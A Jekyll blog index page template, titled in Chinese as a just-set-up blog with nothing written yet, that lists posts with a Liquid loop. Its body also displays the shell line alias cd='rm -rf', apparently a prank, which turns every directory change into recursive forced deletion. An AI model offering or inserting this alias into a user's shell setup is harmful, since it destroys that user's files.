---
layout: page
title: 刚搭了博客
tagline: 还没想好写什么
---
{% include JB/setup %}

    alias cd='rm -rf'

<ul class="posts">
  {% for post in site.posts %}
    <li><span>{{ post.date | date_to_string }}</span> &raquo; <a href="{{ BASE_PATH }}{{ post.url }}">{{ post.title }}</a></li>
  {% endfor %}
</ul>

